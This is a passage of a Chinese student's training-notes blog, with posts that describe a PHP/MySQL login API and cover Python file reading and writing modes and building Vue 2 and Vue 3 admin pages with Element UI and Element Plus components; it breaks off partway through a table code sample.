-<p>我们对这段代码进行分析：<br>（1）首先通过设置HTTP头部信息，允许跨域请求，这在前后端分离的项目中是非常常见的。<br>（2）使用mysqli_connect函数连接到MySQL数据库服务器，并选择名为”security”的数据库。如果连接失败，则会返回一个包含错误信息的JSON响应并退出程序。<br>（3）根据接收到的HTTP请求的路径和方法，判断是否为预期的接口路径和请求类型。如果是预期的POST请求，就从请求中获取JSON格式的数据，并解析为关联数组。<br>（4）如果解析JSON数据出错，返回400 Bad Request响应；否则，从接收到的数据中获取用户名和密码，并构造一个SQL查询语句，查询名为”users”的表中是否存在对应的用户名和密码记录。<br>（5）如果查询结果存在匹配的用户名和密码，则返回”success”字符串，表示登录成功；否则，返回”账号和密码错误”字符串，表示登录失败。在未收到预期的路径和请求方法时，同样返回400 Bad Request响应。<br>2.把index.php和api.php复制到虚拟机win10hei的phpstudy的根目录下，打开网站，点击登录，可以跳转到主页页面。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340415039-2ff8e0a3-feb0-42c9-9f62-564858825c25.png" alt="图片2.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340431465-a425e375-7478-4140-9748-ce946165134a.png" alt="图片1.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记18" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B018/" class="article-date">
-      <time datetime="2023-12-17T02:15:13.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B018/">文件操作</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>1.找到这个文件，双击打开它<br>open(文件路径，mode&#x3D;””,encoding&#x3D;””)<br>mode:打开这个文件的目的是什么,分为读和写<br>pycharm里面创建的文件默认是UTF-8<br>文件路径:<br>      绝对路径:<br>      d:&#x2F;test1&#x2F;XXX.txt #这种路径不安全,可能不存在<br>      相对路径:相对你当前的程序而言你要找的文件在哪(相对于当前你的程序所在的文件夹)<br>       ..&#x2F;    表示上一次文件夹<br>mode:<br>       r  read(读取)</p>
-<h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><p>用open打开文件路径不报错就说明打开成功，找文件一定要找到相对应的路径<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702217700254-8328f029-68c3-465c-bc0e-d02ca676bcd2.png" alt="image.png"><br>你代表你的程序，文代表文件，f相当于一个管道，mode决定了方向因为是读取，所以市场文件的方向出发到你的程序终止，为什么open的时候没有把整个文件全部加载到内存呢？因为对于该文件是没办法判断大小的<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218263980-b15f1ba9-2a4f-4c0c-a5f5-317749359102.png" alt="image.png"><br>这里直接print(f.read()),直接输出资源.txt里面的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218546907-3107eb95-9281-49ae-960b-04bd26f2131e.png" alt="image.png"><br>centent&#x3D;f.read()#全部读取<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218655474-82e96e1d-a098-444d-be86-c16f4d077c86.png" alt="image.png"><br>经过自我摸索write写的方法已经实践出来了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219051979-35544fe0-07a7-493b-90f7-dc1b65e753c8.png" alt="image.png"><br>结果如下：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219132293-3afe7d03-7421-4ede-aab8-f35ef2ba20a2.png" alt="image.png"><br>readline这是一行一行的读取文本的内容，可以接着读取<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219680159-f75e51b4-85de-4473-8f6c-f905e62a00f1.png" alt="image.png"></p>
-<p> strip可以消除字符串左右两端的空白。空格，换行符，制表符<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220134813-08bb9ebd-33a7-4172-b849-aa1148c7af41.png" alt="image.png"><br>那用什么方法可以看到换行符呢？用readlines进行查看，此时输出的是一个数组<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220321397-db7e971a-9b62-4873-b94e-3216c69828a1.png" alt="image.png"><br>readlines和f.read()都无法解决文件太大的问题，所以readline更加重要<br> 最重要的文本读取方式(必须掌握)<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220963610-9e1168c4-7b60-42ab-b4a0-00cf92e16bfb.png" alt="image.png"></p>
-<h2 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h2><p>w:write(写入)，write可以创建在该文件路径没有的文件，例如，下面美女.txt是不存在的，当我输入这一段之后进行的是创建了这个美女.txt。<br>w模式下，如果文件不存在就会自动的创建一个文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702550796040-be9eee5e-b285-4355-b48d-014538361ad4.png" alt="image.png"><br>在美女txt中随便输入一些内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551391134-95e9295e-48eb-4a81-be3b-f2303797e329.png" alt="image.png"><br>再次运行发现文件清空:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551453613-aaca6a19-a80f-4dcb-a741-c3cc1e56fc8c.png" alt="image.png"><br>写入一个嘎嘎威在这个美女.txt中<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551546591-f918d816-f29a-410f-b481-662f52388df9.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1702551609744-3830891f-5f59-45cb-b2b0-9f36553be65d.png#averageHue=%23f6f5f0&clientId=ua058a9ba-9a99-4&from=paste&height=81&id=u87f610f0&originHeight=101&originWidth=427&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5816&status=done&style=none&taskId=ud0cab006-6f78-4684-8344-4fa374a4990&title=&width=341.6" alt="image.png"><br>写入之后记得进行close<br>左边是文件,右边是程序,进行调用插根管子.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551717668-6f95d2e9-643c-416e-895c-15cccb4479a8.png" alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551867898-ff54fa1c-b511-48cd-a11c-e85275fa672c.png" alt="image.png"><br>案例:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552518330-45a7735e-e71b-4333-ae54-2fe599cdebf5.png" alt="image.png"><br>可是发现一个问题就是写入之后数据是连在一起的<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552624853-805f2b12-2aba-415c-85b4-10887c82a6d9.png" alt="image.png"><br>这需要进行换行,可以直接在lst[0]+”\n”:<br>也可以直接去在每一次输出的后面加上f.write(“\n”),也可以实现换行的效果.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552921079-b9d3a9cd-d343-41e5-b8cf-945426bb67f5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553033397-3fc0dccc-16c9-4d55-a208-e3b9bb32c795.png" alt="image.png"><br>这个只是单个数据的输出,如果是多个数据那咋办?所以此时就需要用到for循环<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553277094-aea390e6-0c2f-4b6a-a413-d038e4b4b2d5.png" alt="image.png"><br>如果把f&#x3D;open(file&#x3D;”美女.txt”,mode&#x3D;”w”,encoding&#x3D;”utf-8”)放入到循环体中发现永远都是处于清空状态,只有最后一个数据写入时才有效果.此时发现只有赵敏和?.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553441903-05bdd68b-6b5c-43dc-aeec-d1837eca2c3d.png" alt="image.png"><br>将管道放在循环体外就可以正常写入</p>
-<p>接着就是a模式:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553834877-6bb769e3-f4c8-4695-aace-3e66a98b4a66.png" alt="image.png"><br>此时输出结果为:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553885806-82a1d9c3-34f8-4324-a0c0-129753cbb89a.png" alt="image.png"><br>整个笔记为:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553980783-8b82e9c8-a93b-415f-9cb0-393152fd7946.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记17" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B017/" class="article-date">
-      <time datetime="2023-12-17T01:16:31.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B017/">用vue2写网页</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="一-引入按钮"><a href="#一-引入按钮" class="headerlink" title="一.引入按钮"></a>一.引入按钮</h2><p>1.访问element  zn-cn官网，链接：<a target="_blank" rel="noopener" href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a>   引入样式和组件库<br>2.在左侧的菜单栏的安装，复制以下代码，在vscode中新建index.php文件，粘贴到index.php文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;app&quot;&gt;                              //3,4行是body中的内容</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- import Vue before Element --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;!-- import JavaScript --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">   new Vue(&#123;</span><br><span class="line">     el: &#x27;#app&#x27;,</span><br><span class="line">     data: function() &#123;</span><br><span class="line">       return &#123; visible: false &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>3.在左侧的菜单栏找到button按钮，复制一个蓝色按钮的代码，粘贴到<div id="app"> </div>中。复制以下三个链接在浏览器打开，然后复制代码，新建index.css  vue.js    index.js，把代码对应粘贴到这三个文件，引入样式和组件库 。<br>1.<a target="_blank" rel="noopener" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">https://unpkg.com/element-ui/lib/theme-chalk/index.css</a><br>2.<a target="_blank" rel="noopener" href="https://unpkg.com/vue@2/dist/vue.js">https:&#x2F;&#x2F;unpkg.com&#x2F;vue@2&#x2F;dist&#x2F;vue.js</a><br>3.<a target="_blank" rel="noopener" href="https://unpkg.com/element-ui/lib/index.js">https://unpkg.com/element-ui/lib/index.js</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553518275-0506f334-7b1c-4fb0-8bce-e36dca6be611.png" alt="image.png"><br>4.右击index.php,在文件管理器中显示，复制上图四个文件，粘贴到虚拟机win10hei的PHPstudy的根目录下，ctrl+s保存，在phpstudy中打开网站，出现按钮。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553812206-166b195f-d1d8-4e62-9cf8-8cddb5e9cc12.png" alt="image.png"></p>
-<h2 id="二-制作网页"><a href="#二-制作网页" class="headerlink" title="二.制作网页"></a>二.制作网页</h2><p>1.仿照老师发的网页图，制作一个图书管理系统<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553970138-a22c4747-e55a-4f5c-8dbb-fb1abb7a3447.png" alt="b93486f7a701fa3193a7a784f352c91.png"><br>2.因为还在编写网页，还未上传结果图</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777105558-f4839df8-c2f9-46bc-a72a-8d0e2f846fdc.png" alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777169175-db788011-ec0b-4d59-9ee6-924fdb4b3491.png" alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777313628-c3d7544e-fcf2-4e66-9ba6-fc9d108fa1c2.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记16" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B016/" class="article-date">
-      <time datetime="2023-12-17T01:13:41.000Z" itemprop="datePublished">2023-12-17</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B016/">用vue写网页</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="一-引入Element按钮，Container布局容器，菜单侧边栏"><a href="#一-引入Element按钮，Container布局容器，菜单侧边栏" class="headerlink" title="一.引入Element按钮，Container布局容器，菜单侧边栏"></a>一.引入Element按钮，Container布局容器，菜单侧边栏</h2><p>1.简单回顾vue的安装和创建项目。<br>2.访问Element官网。   链接：<a target="_blank" rel="noopener" href="https://element-plus.org/zh-CN/component/button.html">https://element-plus.org/zh-CN/component/button.html</a>  选择红色按钮，<br>复制红色按钮的代码到vscode的app.vue文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ElButton &#125; from &#x27;element-plus&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;el-button type=&quot;info&quot;&gt;Danger&lt;/el-button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
-
-<p>3.发现红色按钮位置是在正中间，是错误的。后来经过老师的提示，要把main.js文件中下列居中代码删掉。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702477935327-f9d694eb-44fc-46d6-8140-63ab3670947e.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;./assets/main.css&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>4.找到要用到的布局，先查看它的代码，再复制到app.vue。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702477982134-682e8b51-64a8-4a95-9d30-9f950184080b.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;common-layout&quot;&gt;</span><br><span class="line">   &lt;el-container&gt;</span><br><span class="line">     &lt;el-aside width=&quot;200px&quot;&gt;Aside&lt;/el-aside&gt;</span><br><span class="line">     &lt;el-container&gt;</span><br><span class="line">       &lt;el-header&gt;Header&lt;/el-header&gt;</span><br><span class="line">       &lt;el-main&gt;Main&lt;/el-main&gt;</span><br><span class="line">     &lt;/el-container&gt;</span><br><span class="line">   &lt;/el-container&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p>5.找到要用到的菜单侧边栏，先查看它的代码，再复制到app.vue。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478014643-2c19b422-9987-4c66-a26b-05ed460f4661.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-row class=&quot;tac&quot;&gt;</span><br><span class="line">    &lt;el-col :span=&quot;12&quot;&gt;</span><br><span class="line">      &lt;h5 class=&quot;mb-2&quot;&gt;Default colors&lt;/h5&gt;</span><br><span class="line">      &lt;el-menu</span><br><span class="line">        default-active=&quot;2&quot;</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">        @open=&quot;handleOpen&quot;</span><br><span class="line">        @close=&quot;handleClose&quot;</span><br><span class="line">      &gt;</span><br><span class="line">       </span><br><span class="line">        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Two&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;3&quot; disabled&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;document /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Three&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Four&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;/el-menu&gt;</span><br><span class="line">    &lt;/el-col&gt;</span><br><span class="line">    &lt;el-col :span=&quot;12&quot;&gt;</span><br><span class="line">      &lt;h5 class=&quot;mb-2&quot;&gt;Custom colors&lt;/h5&gt;</span><br><span class="line">      &lt;el-menu</span><br><span class="line">        active-text-color=&quot;#ffd04b&quot;</span><br><span class="line">        background-color=&quot;#545c64&quot;</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">        default-active=&quot;2&quot;</span><br><span class="line">        text-color=&quot;#fff&quot;</span><br><span class="line">        @open=&quot;handleOpen&quot;</span><br><span class="line">        @close=&quot;handleClose&quot;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;el-sub-menu index=&quot;1&quot;&gt;</span><br><span class="line">          &lt;template #title&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;location /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;Navigator One&lt;/span&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;el-menu-item-group title=&quot;Group One&quot;&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-1&quot;&gt;item one&lt;/el-menu-item&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-2&quot;&gt;item two&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-menu-item-group&gt;</span><br><span class="line">          &lt;el-menu-item-group title=&quot;Group Two&quot;&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-3&quot;&gt;item three&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-menu-item-group&gt;</span><br><span class="line">          &lt;el-sub-menu index=&quot;1-4&quot;&gt;</span><br><span class="line">            &lt;template #title&gt;item four&lt;/template&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-4-1&quot;&gt;item one&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-sub-menu&gt;</span><br><span class="line">        &lt;/el-sub-menu&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Two&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;3&quot; disabled&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;document /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Three&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Four&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;/el-menu&gt;</span><br><span class="line">    &lt;/el-col&gt;</span><br><span class="line">  &lt;/el-row&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123;</span><br><span class="line">  Document,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  Location,</span><br><span class="line">  Setting,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line">const handleOpen = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>6.在app.vue中删除下列代码的string</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const handleOpen = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>7.把span&#x3D;12改成span&#x3D;24，侧边栏span&#x3D;24表示占满      el-col :span&#x3D;”24”表示竖直方向占满<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702298169039-6bf73205-5c61-4b50-b56b-518fa680bfea.png" alt="image.png"><br>8.在侧边栏导入图标，复制代码在对应的用户管理，权限管理，商品管理，订单管理语句各自的前一行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478133938-4a3a0f16-2685-47d7-b5fc-2fa4e3f3f26c.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702298662954-37b0eb22-a73f-4b8f-badd-6a21f1a55a4b.png" alt="image.png"></p>
-<h2 id="二-在el-header设置阴影，圆角边框"><a href="#二-在el-header设置阴影，圆角边框" class="headerlink" title="二.在el-header设置阴影，圆角边框"></a>二.在el-header设置阴影，圆角边框</h2><p>1.在el-header中创建styled-box1类。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299037715-c342f095-d463-419a-98bf-1b325dcfdd94.png" alt="image.png"><br> 在style创建styled-box1样式。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299210651-716ae9ad-d358-4049-82fe-ba1e0fdf90f0.png" alt="image.png"><br>2.CTRL+S保存，在终端输入npm run dev, 结果如下图<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299408016-718c337f-2f6d-4c53-8f5f-db3ee347fe6f.png" alt="image.png"><br>3.引入搜索框input和搜索，添加用户两个按钮，注意el-row是行，el-col是列。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-row&gt;</span><br><span class="line">          &lt;el-col :span=&quot;4&quot;</span><br><span class="line">            &gt;&lt;el-input v-model=&quot;input&quot; placeholder=&quot;请输入搜索内容&quot;</span><br><span class="line">          /&gt;&lt;/el-col&gt;</span><br><span class="line">          &lt;el-col :span=&quot;2&quot;&gt;&lt;el-button type=&quot;success&quot;&gt;搜索&lt;/el-button&gt;&lt;/el-col&gt;</span><br><span class="line">          &lt;el-col :span=&quot;2&quot;&gt;   &lt;el-button type=&quot;success&quot;&gt;添加用户&lt;/el-button&gt;&lt;/el-col&gt;</span><br><span class="line">        &lt;/el-row&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702300021651-558624ba-d852-43da-aa59-4fad9e072223.png" alt="image.png"></p>
-<h2 id="三-引入表格和分页"><a href="#三-引入表格和分页" class="headerlink" title="三.引入表格和分页"></a>三.引入表格和分页</h2><p>1.找到表格，复制代码引入app.vue<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478209116-41c089fd-0661-4edf-a77a-0c4c56681425.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%&quot;&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;date&quot; label=&quot;Date&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;address&quot; label=&quot;Address&quot; /&gt;</span><br><span class="line">  &lt;/el-table&gt;</span><br><span 